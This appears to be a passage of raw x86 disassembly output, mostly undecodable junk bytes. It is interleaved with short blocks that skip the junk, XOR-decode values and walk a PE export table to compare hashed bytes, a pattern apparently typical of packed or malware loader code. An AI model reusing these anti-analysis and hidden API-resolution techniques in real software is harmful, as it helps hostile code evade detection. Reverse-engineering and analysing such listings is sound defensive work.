  4020c5:	gs pushf 
  4020c7:	cmc    
  4020c8:	(bad)  
  4020c9:	dec    ebp
  4020ca:	and    eax,0xdd3656ba
  4020cf:	inc    esp
  4020d0:	test   DWORD PTR [edi+0x38],edi
  4020d3:	fidivr WORD PTR [ebp+0x5e012a3c]
  4020d9:	pop    eax
  4020da:	(bad)  
  4020db:	mul    DWORD PTR [esi-0x7d]
  4020de:	inc    edx
  4020df:	mov    eax,0x336b9105
  4020e4:	mov    eax,0xbfc2046b
  4020e9:	cmp    BYTE PTR [edx],dh
  4020eb:	mov    WORD PTR ds:0x17e12cc6,ds
  4020f1:	dec    edi
  4020f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4020f3:	sbb    BYTE PTR [ebx+ebp*2+0x5d0bc2d9],cl
  4020fa:	pop    edx
  4020fb:	fcom   st(2)
  4020fd:	lods   al,BYTE PTR ds:[esi]
  4020fe:	sbb    BYTE PTR [edx],bh
  402100:	xor    BYTE PTR ds:0x177967a7,dh
  402106:	mov    ebp,0x694b129b
  40210b:	sbb    DWORD PTR [ecx-0x17],esi
  40210e:	mov    ebx,DWORD PTR ds:0xb072ce70
  402114:	jno    0x402128
  402116:	rcr    DWORD PTR [ebx-0x5c1fb002],1
  40211c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40211d:	inc    ecx
  40211e:	xchg   edi,eax
  40211f:	add    eax,0xce0067a2
  402124:	cmp    BYTE PTR [eax+0xe],0xd4
  402128:	hlt    
  402129:	repnz xchg edi,eax
  40212b:	and    esi,DWORD PTR [edx-0x1248fe6b]
  402131:	(bad)  
  402132:	adc    BYTE PTR [eax-0x55],ah
  402135:	fwait
  402136:	hlt    
  402137:	mov    eax,0x47939d4c
  40213c:	add    BYTE PTR [edi+0x64],dl
  40213f:	pop    ss
  402140:	stc    
  402141:	arpl   WORD PTR [edi],bp
  402143:	and    eax,0x70b174bb
  402148:	fucomi st,st(0)
  40214a:	pop    edx
  40214b:	jge    0x402135
  40214d:	dec    edx
  40214e:	inc    esp
  40214f:	push   eax
  402150:	lock dec esp
  402152:	aam    0xd3
  402154:	retf   0xe02e
  402157:	outs   dx,BYTE PTR ds:[esi]
  402158:	inc    ebx
  402159:	pop    ss
  40215a:	not    BYTE PTR [edx]
  40215c:	jns    0x402102
  40215e:	ja     0x40210d
  402160:	popf   
  402161:	jge    0x4021de
  402163:	repnz cmps DWORD PTR gs:[esi],DWORD PTR es:[edi]
  402166:	fs ss inc eax
  402169:	jno    0x4021c9
  40216b:	test   eax,0xb0f4ea3f
  402170:	xchg   edi,eax
  402171:	xor    esi,DWORD PTR [eax-0x9423e40]
  402177:	cdq    
  402178:	fs or  al,0xb4
  40217b:	out    dx,eax
  40217c:	add    esp,DWORD PTR [ebp-0x348aedfe]
  402182:	or     dh,ch
  402184:	jg     0x4021ba
  402186:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402187:	mov    ds:0x4321d329,al
  40218c:	sbb    esp,DWORD PTR [edi]
  40218e:	aam    0x12
  402190:	pop    edx
  402191:	test   esi,edi
  402193:	push   0x60
  402195:	retf   
  402196:	and    al,0x85
  402198:	sub    eax,0x77ede137
  40219d:	adc    dh,bh
  40219f:	pop    esp
  4021a0:	and    al,0xd5
  4021a2:	inc    eax
  4021a3:	aaa    
  4021a4:	(bad)  
  4021a6:	out    0xa8,al
  4021a8:	cmc    
  4021a9:	push   bp
  4021ab:	xchg   edx,eax
  4021ac:	mov    dh,0xfd
  4021ae:	inc    ebp
  4021af:	pop    es
  4021b0:	mov    esi,DWORD PTR [ebx]
  4021b2:	jl     0x40221a
  4021b4:	(bad)  
  4021b5:	fld    DWORD PTR [eax]
  4021b7:	arpl   WORD PTR [ebx-0x60],dx
  4021ba:	xchg   edx,eax
  4021bb:	sbb    edx,esp
  4021bd:	mov    cl,bl
  4021bf:	loop   0x40220a
  4021c1:	adc    bl,BYTE PTR [edx]
  4021c3:	cmp    BYTE PTR [ebx],0x2f
  4021c6:	jmp    0xb4008daa
  4021cb:	ds sahf 
  4021cd:	push   ss
  4021ce:	js     0x402223
  4021d0:	jns    0x40216d
  4021d2:	push   ebx
  4021d3:	aaa    
  4021d4:	dec    ebp
  4021d5:	inc    ecx
  4021d6:	test   BYTE PTR [ebx+0x5d],cl
  4021d9:	enter  0xabc4,0xfa
  4021dd:	aaa    
  4021de:	jns    0x4021f2
  4021e0:	xchg   ecx,eax
  4021e1:	sbb    DWORD PTR [edi+0x2475c497],esi
  4021e7:	lds    edi,FWORD PTR [esp+eax*8-0x7f6b0a34]
  4021ee:	mov    dh,0xa3
  4021f0:	clc    
  4021f1:	ror    DWORD PTR ds:0x540b8111,1
  4021f7:	fwait
  4021f8:	push   edx
  4021f9:	xchg   ebp,eax
  4021fa:	sub    DWORD PTR [esi+0x716ee125],ecx
  402200:	xchg   ecx,eax
  402201:	sbb    dh,BYTE PTR [edx]
  402203:	out    0x2e,eax
  402205:	jl     0x4021cc
  402207:	mov    edx,0x4dd01e14
  40220c:	jg     0x402203
  40220e:	in     eax,dx
  40220f:	jge    0x4021a1
  402211:	in     eax,dx
  402212:	xlat   BYTE PTR ds:[ebx]
  402213:	clc    
  402214:	mov    eax,0x9ca02f43
  402219:	clc    
  40221a:	or     esi,DWORD PTR [ebx]
  40221c:	push   edx
  40221d:	retf   0xe1cc
  402220:	les    esi,FWORD PTR [edx+0x3b]
  402223:	xlat   BYTE PTR fs:[ebx]
  402225:	call   0xf3a1d619
  40222a:	xchg   edx,eax
  40222b:	dec    eax
  40222c:	jb     0x40227a
  40222e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40222f:	pop    ebx
  402230:	mov    al,0x3f
  402232:	xchg   BYTE PTR [edi+0x3e],ah
  402235:	mov    edi,0xbfac121f
  40223a:	lea    esi,[edi+0x34]
  40223d:	push   esi
  40223e:	and    edx,ebx
  402240:	mov    al,0x4a
  402242:	int3   
  402243:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402244:	or     DWORD PTR [ebx],eax
  402246:	mov    ebp,0xf51afc3b
  40224b:	inc    ebp
  40224c:	leave  
  40224d:	xchg   ecx,eax
  40224e:	mov    esi,ebp
  402250:	sbb    al,dl
  402252:	sub    ah,bl
  402254:	stos   DWORD PTR es:[edi],eax
  402255:	pusha  
  402256:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402257:	sti    
  402258:	or     ch,ch
  40225a:	shr    DWORD PTR [edx+0x68202d76],1
  402260:	bound  eax,QWORD PTR ds:[ecx+0x4d896643]
  402267:	cld    
  402268:	jmp    0x40227a
  40226d:	xor    eax,esi
  40226f:	lea    eax,[eax+ecx*1+0x327299]
  402276:	mov    WORD PTR [ebp-0x4],ax
  40227a:	mov    eax,DWORD PTR [ebp-0xc]
  40227d:	cmp    eax,ebx
  40227f:	je     0x402293
  402285:	mov    eax,DWORD PTR [ebp-0x8]
  402288:	mov    DWORD PTR [eax],0x60341e8e
  40228e:	jmp    0x4028b6
  402293:	mov    eax,DWORD PTR [ebp+0x8]
  402296:	mov    ecx,DWORD PTR [ebp-0x8]
  402299:	xor    eax,esi
  40229b:	add    eax,edi
  40229d:	cmp    DWORD PTR [ecx],eax
  40229f:	je     0x40289e
  4022a5:	mov    ecx,DWORD PTR [ebp-0x14]
  4022a8:	mov    eax,DWORD PTR [ebp-0x8]
  4022ab:	mov    eax,DWORD PTR [eax]
  4022ad:	mov    eax,DWORD PTR [eax+0x3c]
  4022b0:	lea    ecx,[ecx*8+0x78]
  4022b7:	add    eax,ecx
  4022b9:	jmp    0x40248d
  4022be:	je     0x402337
  4022c0:	int3   
  4022c1:	xchg   ecx,eax
  4022c2:	int    0xbd
  4022c4:	jne    0x402339
  4022c6:	jae    0x4022b2
  4022c8:	(bad)  
  4022c9:	mov    ebx,cr1
  4022cc:	test   eax,0x7e03b66a
  4022d1:	jle    0x402288
  4022d3:	jg     0x402353
  4022d5:	jle    0x40225d
  4022d7:	adc    ah,dl
  4022d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4022da:	mov    al,al
  4022dc:	sbb    DWORD PTR [ebx+0x1],0x7322d05a
  4022e3:	or     cl,BYTE PTR [ecx+ebx*4-0xf]
  4022e7:	jmp    0x4022d8
  4022e9:	imul   ecx,DWORD PTR [eax],0x14
  4022ec:	out    0xc6,eax
  4022ee:	pusha  
  4022ef:	cmp    al,0xfd
  4022f1:	or     edi,esp
  4022f3:	ret    0x2175
  4022f6:	pop    ebx
  4022f7:	add    ch,cl
  4022f9:	xor    al,0xb5
  4022fb:	fstp   st(4)
  4022fd:	xchg   ecx,eax
  4022fe:	mov    ds:0x8cd172f,al
  402303:	push   esp
  402304:	jle    0x4022ed
  402306:	repz test dl,cl
  402309:	inc    esi
  40230a:	mov    al,0xe0
  40230c:	jle    0x40235e
  40230e:	sbb    ebp,DWORD PTR [edx]
  402310:	hlt    
  402311:	jecxz  0x40235f
  402313:	scas   al,BYTE PTR es:[edi]
  402314:	jb     0x4022e4
  402316:	sub    eax,0xb4fbfca
  40231b:	pop    ds
  40231c:	push   0x650f7764
  402321:	mov    ch,BYTE PTR [ebx+0xf7429e0]
  402327:	popa   
  402328:	jb     0x4022dc
  40232a:	cmc    
  40232b:	jecxz  0x4022af
  40232d:	dec    esp
  40232e:	out    0xd6,eax
  402330:	lods   al,BYTE PTR ds:[esi]
  402331:	mov    al,ds:0xa79130f0
  402336:	adc    ecx,DWORD PTR [ebp+0x11]
  402339:	popa   
  40233a:	ss loop 0x402385
  40233d:	shl    DWORD PTR [ecx+0x52],0xe2
  402341:	fcomp  QWORD PTR [ecx]
  402343:	inc    esi
  402344:	mov    eax,ds:0xf4f4fdbe
  402349:	push   cs
  40234a:	inc    edx
  40234b:	mov    eax,0xbcccc22a
  402350:	sbb    eax,0xae46949
  402355:	cld    
  402356:	fcmovne st,st(4)
  402358:	loop   0x40239a
  40235a:	std    
  40235b:	inc    ecx
  40235c:	lea    ebp,[ebx+0x21192087]
  402362:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402363:	ror    dh,1
  402365:	(bad)  
  402366:	jmp    0x63159437
  40236b:	cmp    ch,BYTE PTR [ebx-0x13]
  40236e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40236f:	out    dx,eax
  402370:	fwait
  402371:	rcl    BYTE PTR [ecx+eiz*4],1
  402374:	add    al,0xdf
  402376:	fild   QWORD PTR [edi]
  402378:	jae    0x402397
  40237a:	inc    edx
  40237b:	cdq    
  40237c:	mov    ah,0xa6
  40237e:	push   edi
  40237f:	push   0x34
  402381:	mov    ch,0xbb
  402383:	jmp    0x40235b
  402385:	xor    BYTE PTR [edi],al
  402387:	sbb    ah,BYTE PTR [esp+ecx*1+0x6dc6d5f4]
  40238e:	out    0x4e,eax
  402390:	inc    edx
  402391:	cdq    
  402392:	sub    dh,BYTE PTR [edi]
  402394:	and    al,0x3
  402396:	inc    edx
  402397:	hlt    
  402398:	dec    esi
  402399:	lods   eax,DWORD PTR ds:[esi]
  40239a:	inc    eax
  40239b:	cli    
  40239c:	test   DWORD PTR [ebx+0x29],edx
  40239f:	and    ebx,esi
  4023a1:	hlt    
  4023a2:	dec    edi
  4023a3:	inc    ecx
  4023a4:	enter  0x19bb,0x8e
  4023a8:	scas   al,BYTE PTR es:[edi]
  4023a9:	mov    dh,0x2b
  4023ab:	cld    
  4023ac:	aad    0x5f
  4023ae:	mov    ds:0xd9f246c6,al
  4023b3:	and    BYTE PTR [esi+0x690bfe74],cl
  4023b9:	or     al,0x31
  4023bb:	mov    ch,0xc3
  4023bd:	push   ecx
  4023be:	xor    ecx,DWORD PTR [eax]
  4023c0:	ds and eax,0x938628a8
  4023c6:	or     al,cl
  4023c8:	sbb    al,0xbd
  4023cb:	inc    edi
  4023cc:	xor    DWORD PTR [ecx+0x10],edi
  4023cf:	dec    BYTE PTR [ebp+0x12b29580]
  4023d5:	mov    eax,0x1495bc5f
  4023da:	mov    dl,0xa3
  4023dc:	fistp  DWORD PTR [ebx-0x12651b8]
  4023e2:	xlat   BYTE PTR ds:[ebx]
  4023e3:	pop    esi
  4023e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4023e5:	dec    ebp
  4023e6:	mov    cl,0x8c
  4023e8:	ror    DWORD PTR [esi+eiz*8-0x3f],1
  4023ec:	mov    eax,ds:0xc3df76b1
  4023f1:	xor    dl,dl
  4023f3:	pop    ecx
  4023f4:	lahf   
  4023f5:	shl    ecx,0xc7
  4023f8:	shr    edx,1
  4023fa:	(bad)  
  4023fc:	xchg   ecx,edi
  4023fe:	into   
  4023ff:	pop    es
  402400:	sbb    ch,BYTE PTR es:[ebx+0x56d7f2fc]
  402407:	dec    esp
  402408:	jns    0x4023ab
  40240a:	and    BYTE PTR [edi],0x27
  40240d:	cmp    BYTE PTR [eax+ebx*1-0x285520d5],ah
  402414:	xchg   esp,eax
  402415:	inc    eax
  402416:	iret   
  402417:	mov    esp,eax
  402419:	pop    ecx
  40241a:	pop    es
  40241b:	mov    eax,0xf2e4b28f
  402420:	mov    ebp,0xfd260e2f
  402425:	repz inc ecx
  402427:	out    dx,eax
  402428:	je     0x40248f
  40242a:	leave  
  40242b:	adc    DWORD PTR [edi+0xb],ebx
  40242e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40242f:	and    BYTE PTR cs:[ecx-0xc3a39f9],ch
  402436:	mov    al,ds:0xcf49b56d
  40243b:	and    eax,0xbdb69d24
  402440:	fldcw  WORD PTR [ebp-0x43]
  402443:	push   edx
  402444:	xchg   edi,eax
  402445:	sub    bl,BYTE PTR [esi]
  402447:	xchg   edx,eax
  402448:	call   0x35f0:0xecdd5a28
  40244f:	inc    eax
  402450:	(bad)  
  402451:	cmp    esp,eax
  402453:	clc    
  402454:	in     eax,dx
  402455:	inc    edi
  402456:	push   ds
  402457:	add    esi,eax
  402459:	lods   al,BYTE PTR ds:[esi]
  40245a:	rcr    BYTE PTR [ecx],0x60
  40245d:	pop    ecx
  40245e:	ins    WORD PTR es:[edi],dx
  402460:	xchg   ebx,eax
  402461:	(bad)  
  402462:	dec    ebp
  402463:	jmp    0xaa03a06a
  402468:	push   edx
  402469:	popf   
  40246a:	popf   
  40246b:	jne    0x40245e
  40246d:	div    esp
  40246f:	xchg   esi,eax
  402470:	call   0x46d96d7c
  402475:	and    DWORD PTR [edi],edx
  402477:	ins    DWORD PTR es:[edi],dx
  402478:	js     0x4024c2
  40247a:	sbb    dl,bl
  40247c:	sti    
  40247d:	shl    BYTE PTR [edx+esi*2-0x15],1
  402481:	mov    ecx,0x5c488ab2
  402486:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402487:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402488:	leave  
  402489:	and    al,0x15
  40248b:	retf   0x8b94
  40248e:	dec    ebp
  40248f:	clc    
  402490:	mov    ecx,DWORD PTR [ecx]
  402492:	mov    eax,DWORD PTR [eax+ecx*1]
  402495:	mov    DWORD PTR [ebp-0x1c],eax
  402498:	mov    eax,DWORD PTR [ebp+0x8]
  40249b:	xor    eax,esi
  40249d:	add    eax,edi
  40249f:	mov    DWORD PTR [ebp-0x20],eax
  4024a2:	mov    eax,DWORD PTR [ebp+0x8]
  4024a5:	mov    ecx,DWORD PTR [ebp-0x1c]
  4024a8:	xor    eax,esi
  4024aa:	add    eax,edi
  4024ac:	cmp    ecx,eax
  4024ae:	je     0x4028b6
  4024b4:	mov    eax,DWORD PTR [ebp-0x8]
  4024b7:	mov    ecx,DWORD PTR [ebp-0x1c]
  4024ba:	add    ecx,DWORD PTR [eax]
  4024bc:	jmp    0x402690
  4024c1:	xor    al,0x5a
  4024c3:	inc    edx
  4024c4:	pop    ebp
  4024c5:	pop    esp
  4024c6:	jge    0x4024fd
  4024c8:	arpl   WORD PTR [edx],ax
  4024ca:	outs   dx,BYTE PTR ds:[esi]
  4024cb:	dec    esi
  4024cc:	or     eax,0xf96d8e39
  4024d1:	in     eax,dx
  4024d2:	or     eax,0x7fb57e7e
  4024d7:	jle    0x402557
  4024d9:	mov    esp,DWORD PTR [esi-0x237c3f21]
  4024df:	xchg   ecx,eax
  4024e0:	enter  0xdb0,0xf0
  4024e4:	int3   
  4024e5:	loop   0x402498
  4024e7:	dec    eax
  4024e8:	repz hlt 
  4024ea:	fldenv [edx+0x4089f7d1]
  4024f0:	ret    0x3a31
  4024f3:	ins    BYTE PTR es:[edi],dx
  4024f4:	jne    0x402575
  4024f6:	mov    WORD PTR [ebx],es
  4024f8:	cwde   
  4024f9:	je     0x402568
  4024fb:	cmc    
  4024fc:	mov    dl,0x59
  4024fe:	shl    eax,0xd0
  402501:	pop    es
  402502:	dec    eax
  402503:	jb     0x40248e
  402505:	stos   BYTE PTR es:[edi],al
  402506:	pop    ss
  402507:	xor    al,0x8c
  402509:	mov    ds:0x185d8379,al
  40250e:	ret    0x6ae9
  402511:	hlt    
  402512:	and    al,0xea
  402514:	sub    dl,0x9b
  402517:	inc    eax
  402518:	push   0x13
  40251a:	jbe    0x4024e8
  40251c:	(bad)  
  40251d:	repz dec edi
  40251f:	sub    ebx,DWORD PTR [esi+ecx*8+0xb]
  402523:	popa   
  402524:	inc    esi
  402525:	pop    ecx
  402526:	in     al,dx
  402527:	aaa    
  402528:	cdq    
  402529:	lock pop ebx
  40252b:	ficomp DWORD PTR [ecx]
  40252d:	mov    ?,WORD PTR [eax+0x29]
  402530:	mov    bl,0x14
  402532:	adc    al,0x43
  402534:	push   ecx
  402535:	and    DWORD PTR [edi],ecx
  402537:	test   al,0x20
  402539:	pop    esp
  40253a:	ins    BYTE PTR es:[edi],dx
  40253b:	aad    0x47
  40253d:	xchg   DWORD PTR [edi-0x78c24cd9],edx
  402543:	sar    DWORD PTR [edx-0x34],0x84
  402547:	out    dx,al
  402548:	ins    BYTE PTR es:[edi],dx
  402549:	pop    ebp
  40254a:	hlt    
  40254b:	stos   BYTE PTR es:[edi],al
  40254c:	mov    BYTE PTR [edi-0x19b72ef6],bh
  402552:	push   ds
  402553:	es dec eax
  402555:	dec    ebp
  402556:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402557:	jge    0x402546
  402559:	clc    
  40255a:	or     al,0x96
  40255c:	retf   
  40255d:	push   ebx
  40255e:	addr16 mov ch,0x1e
  402561:	shl    ch,1
  402563:	or     al,0xf2
  402565:	dec    ebx
  402566:	mov    ebp,fs
  402568:	aas    
  402569:	imul   BYTE PTR [edi+edi*2+0x6eb6e87]
  402570:	pop    es
  402571:	test   al,0x7b
  402573:	jns    0x4025a7
  402575:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402576:	sub    ch,BYTE PTR [ebp-0x17e80dad]
  40257c:	dec    esp
  40257d:	mov    al,0x69
  40257f:	cli    
  402580:	push   ss
  402581:	jae    0x40257c
  402583:	mov    cl,0x39
  402585:	or     eax,0x78b80a3f
  40258a:	cli    
  40258b:	(bad)  
  40258c:	inc    DWORD PTR [esi-0x6fed9536]
  402592:	imul   edx,DWORD PTR [esi+0x29],0x728162a0
  402599:	es fwait
  40259b:	fwait
  40259c:	pusha  
  40259d:	cld    
  40259e:	jle    0x4025ae
  4025a0:	imul   edi,DWORD PTR [esi+0x6d],0xaee810e5
  4025a7:	sbb    ecx,DWORD PTR [edx-0x3df78e47]
  4025ad:	push   0x9
  4025af:	repnz div DWORD PTR [ecx]
  4025b2:	scas   eax,DWORD PTR es:[edi]
  4025b3:	xor    al,0x3f
  4025b5:	xchg   esi,eax
  4025b6:	test   cl,al
  4025b8:	enter  0xa692,0xad
  4025bc:	push   ebp
  4025bd:	mov    esp,0x5ddcd464
  4025c2:	jecxz  0x402575
  4025c4:	iret   
  4025c5:	out    dx,eax
  4025c6:	dec    ecx
  4025c7:	sub    ecx,DWORD PTR [edi+edx*4-0x29]
  4025cb:	mov    BYTE PTR [edi+0x28],0xf3
  4025cf:	test   bh,cl
  4025d1:	out    0xde,eax
  4025d3:	fwait
  4025d4:	jae    0x402647
  4025d6:	imul   esi,DWORD PTR [ebx],0xffffffa6
  4025d9:	and    dh,bh
  4025db:	sub    cl,BYTE PTR [eax-0x65]
  4025de:	ja     0x40257e
  4025e0:	bound  ecx,QWORD PTR [ebx-0x177d8c6d]
  4025e6:	mov    bh,0xdf
  4025e8:	pop    esi
  4025e9:	shl    DWORD PTR [ebp+0x3ef44929],1
  4025ef:	xor    eax,0x32823d27
  4025f4:	pop    ebx
  4025f5:	push   cs
  4025f6:	aam    0xaf
  4025f8:	pop    ss
  4025f9:	or     BYTE PTR [ecx+0x4f752b2b],0x7c
  402600:	adc    ebp,eax
  402602:	or     BYTE PTR [esi-0xedbbf4a],bh
  402608:	lahf   
  402609:	in     al,0xfd
  40260b:	sub    DWORD PTR [esi],ecx
  40260d:	xchg   esi,eax
  40260e:	stos   BYTE PTR es:[edi],al
  40260f:	ror    BYTE PTR [edx-0x2a],cl
  402612:	pushf  
  402613:	or     DWORD PTR ds:0x6c0a97cd,0xffffffec
  40261a:	cmp    ebp,ebx
  40261c:	ja     0x402634
  40261e:	stos   DWORD PTR es:[edi],eax
  40261f:	or     bh,BYTE PTR [ebx]
  402621:	jl     0x4025f7
  402623:	cwde   
  402624:	mov    ?,WORD PTR [ebp-0x5d]
  402627:	xlat   BYTE PTR ds:[ebx]
  402628:	in     al,dx
  402629:	cmp    eax,0x1d9de198
  40262e:	in     al,dx
  40262f:	push   ds
  402630:	shr    dh,1
  402632:	imul   esi,edx,0x7ee48d01
  402638:	loop   0x4026a2
  40263a:	addr16 lock inc eax
  40263d:	and    ebp,DWORD PTR ds:0xa467b8db
  402643:	scas   eax,DWORD PTR es:[edi]
  402644:	mov    esi,0x9c020429
  402649:	int3   
  40264a:	dec    ebx
  40264b:	(bad)  
  40264c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40264d:	push   eax
  40264e:	push   eax
  40264f:	arpl   WORD PTR [edx-0x64],di
  402652:	sbb    al,0xc5
  402654:	add    eax,0xc91a5d25
  402659:	xchg   ebp,eax
  40265a:	push   0xb
  40265c:	cmp    BYTE PTR [eax],0xb4
  40265f:	shl    edi,0xc0
  402662:	leave  
  402663:	push   0x587759e4
  402668:	inc    edx
  402669:	test   eax,0xfb071acb
  40266e:	mov    ds:0xebf3f039,al
  402673:	sar    bh,1
  402675:	shl    BYTE PTR [edx+0x75],cl
  402678:	psubsb mm6,QWORD PTR [edi+0x61]
  40267c:	push   0x40
  40267e:	retf   0x9832
  402681:	inc    eax
  402682:	stos   BYTE PTR es:[edi],al
  402683:	test   al,0x73
  402685:	sbb    BYTE PTR [esi],dl
  402687:	pop    edx
  402688:	mov    dl,bh
  40268a:	pop    edi
  40268b:	pop    eax
  40268c:	xchg   BYTE PTR [esi+esi*4],bl
  40268f:	pop    eax
  402690:	mov    DWORD PTR [ebp-0x20],ecx
  402693:	mov    eax,DWORD PTR [ebp-0x20]
  402696:	mov    ecx,DWORD PTR [ebp-0x8]
  402699:	mov    eax,DWORD PTR [eax+0xc]
  40269c:	mov    ecx,DWORD PTR [ecx]
  40269e:	mov    al,BYTE PTR [eax+ecx*1]
  4026a1:	add    al,0x3a
  4026a3:	xor    al,0x44
  4026a5:	cmp    al,0xc1
  4026a7:	je     0x402892
  4026ad:	mov    eax,DWORD PTR [ebp+0x8]
  4026b0:	mov    ecx,DWORD PTR [ebp-0x8]
  4026b3:	xor    eax,esi
  4026b5:	add    eax,edi
  4026b7:	jmp    0x40288b
  4026bc:	ins    BYTE PTR es:[edi],dx
  4026bd:	jo     0x4026e5
  4026bf:	arpl   WORD PTR [edx],si
  4026c1:	jge    0x402730
  4026c3:	jno    0x402694
  4026c5:	adc    al,0x86
  4026c7:	mov    dl,0x8
  4026c9:	loope  0x4026e9
  4026cb:	mov    ah,0x24
  4026cd:	movd   DWORD PTR [esi-0x4b],mm7
  4026d1:	jg     0x402751
  4026d3:	jle    0x40271b
  4026d5:	sti    
  4026d6:	sbb    eax,0x737657da
  4026db:	scas   al,BYTE PTR es:[edi]
  4026dc:	enter  0xe117,0x93
  4026e0:	add    eax,0xba73ea18
  4026e5:	adc    eax,0x263219a8
  4026ea:	setns  BYTE PTR ds:0x56b020fd
  4026f1:	cmp    dl,BYTE PTR [esi-0x3d]
  4026f4:	lods   al,BYTE PTR ds:[esi]
  4026f5:	sub    edx,DWORD PTR [eax]
  4026f7:	pop    ss
  4026f8:	xor    edx,DWORD PTR [ecx*1+0x249eb8ce]
  4026ff:	int3   
  402700:	or     dh,BYTE PTR [eax]
  402702:	bsf    ecx,DWORD PTR [edi]
  402705:	push   cs
  402706:	outs   dx,BYTE PTR ds:[esi]
  402707:	mov    ah,0xf0
  402709:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40270a:	nop
  40270b:	mov    edi,0xd3ca94d6
  402710:	pop    esi
  402711:	es jbe 0x4026ed
  402714:	dec    ecx
  402715:	cs dec ebx
  402717:	ja     0x402703
  402719:	mov    bl,0xc2
  40271b:	sub    eax,0x66fd1f6b
  402720:	xchg   ecx,eax
  402721:	jmp    0xfee64e44
  402726:	pop    sp
  402728:	ins    BYTE PTR es:[edi],dx
  402729:	sbb    BYTE PTR [edx-0x2e],dh
  40272c:	xor    esp,DWORD PTR ss:[eax]
  40272f:	mov    al,0xd8
  402731:	pop    ds
  402732:	jl     0x4026c4
  402734:	and    al,0xb0
  402736:	push   ebp
  402737:	cdq    
  402738:	xchg   edi,eax
  402739:	sti    
  40273a:	enter  0x674e,0xea
  40273e:	jb     0x4026d1
  402740:	push   ds
  402741:	add    bl,BYTE PTR [ebx+ecx*4+0x634d0d47]
  402748:	sbb    ebx,ebx
  40274a:	mov    es,WORD PTR [edi*2+0x6e478afa]
  402751:	out    0x49,al
  402753:	sbb    eax,0x6d6bc322
  402758:	ins    DWORD PTR es:[edi],dx
  402759:	scas   eax,DWORD PTR es:[edi]
  40275a:	xchg   edx,eax
  40275b:	into   
  40275c:	xor    cl,cl
  40275e:	jnp    0x402758
  402760:	lahf   
  402761:	jmp    0x947b:0x77d9fc30
  402768:	call   FWORD PTR [eax]
  40276a:	or     BYTE PTR [edi+0x57],al
  40276d:	sub    bl,BYTE PTR [esp+ecx*8]
  402770:	xor    DWORD PTR [esi+0x29d085b7],0xffffff89
  402777:	jecxz  0x40276a
  402779:	(bad)  
  40277a:	mov    dh,0x41
  40277c:	fs retf 
  40277e:	jbe    0x35f39974
  402784:	cwde   
  402785:	es mov cl,0x21
  402788:	push   ds
  402789:	or     al,0xb
  40278b:	fbstp  TBYTE PTR [edx+0x5a4a1f1a]
  402791:	inc    eax
  402792:	scas   al,BYTE PTR es:[edi]
  402793:	dec    esp
  402794:	sub    BYTE PTR [edx-0x55],0xbe
  402798:	jb     0x4027de
  40279a:	or     DWORD PTR [edi-0x3c690ef3],ebx
  4027a0:	jmp    0x6152:0x51b201e0
  4027a7:	ins    BYTE PTR es:[edi],dx
  4027a8:	sub    al,0xad
  4027aa:	pop    eax
  4027ab:	test   eax,0xb68a9601
  4027b0:	xlat   BYTE PTR ds:[ebx]
  4027b1:	es jnp 0x40280c
  4027b4:	or     al,0x8
  4027b6:	fisub  WORD PTR [eax+edx*1]
  4027b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4027ba:	rol    BYTE PTR ds:[edi],cl
  4027bd:	cwde   
  4027be:	sub    bh,BYTE PTR [edx]
  4027c0:	adc    DWORD PTR [eax],eax
  4027c2:	sbb    bh,BYTE PTR [edx+0x21516b97]
  4027c8:	mov    esp,0x51425ece
  4027cd:	aad    0x73
  4027cf:	repz fs mov ebx,0xa2b3b8ad
  4027d6:	sub    eax,0x1aae2144
  4027db:	push   ss
  4027dc:	pop    ebx
  4027dd:	add    eax,0xa29e80d8
  4027e2:	cdq    
  4027e3:	test   al,0xdf
  4027e5:	ins    BYTE PTR es:[edi],dx
  4027e6:	pop    ebp
  4027e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4027e8:	lea    eax,[eax]
  4027ea:	mov    DWORD PTR [eax-0x16],edi
  4027ed:	pop    ecx
  4027ee:	inc    ebx
  4027ef:	loope  0x4027b1
  4027f1:	inc    edi
  4027f2:	fidiv  DWORD PTR [eax+0x36c85f0d]
  4027f8:	lods   eax,DWORD PTR ds:[esi]
  4027f9:	push   eax
  4027fa:	fld    QWORD PTR [edi+0x7c]
  4027fd:	pop    ss
  4027fe:	cwde   
  4027ff:	mov    edx,0xff9bf33b
  402804:	dec    eax
  402805:	xchg   BYTE PTR [esi+eax*2-0x5d852cd2],bl
  40280c:	loopne 0x402800
  40280e:	rcl    DWORD PTR [ebx+ebp*8-0x37],cl
  402812:	inc    ebp
  402813:	stos   DWORD PTR es:[edi],eax
  402814:	and    al,0xd6
  402816:	push   es
  402817:	sub    BYTE PTR [ecx+0x2c],dh
  40281a:	ret    
  40281b:	cli    
  40281c:	push   es
  40281d:	sti    
  40281e:	bound  edx,QWORD PTR [ebp-0x35ac9ca9]
  402824:	xchg   cl,bl
  402826:	xor    bh,al
  402828:	popf   
  402829:	icebp  
  40282a:	out    0x3c,eax
  40282c:	add    ebp,DWORD PTR [ebx]
  40282e:	mov    esi,0xb4778c34
  402833:	mov    WORD PTR [ecx+0x186add03],?
  402839:	inc    edx
  40283a:	cdq    
  40283b:	scas   eax,DWORD PTR es:[edi]
  40283c:	sbb    BYTE PTR [eax+0x17],0x6d
  402840:	fmul   DWORD PTR ds:0xb416de7c
  402846:	mov    eax,ds:0x69027bf0
  40284b:	sbb    eax,0x5f14ca89
  402850:	in     al,dx
  402851:	retf   
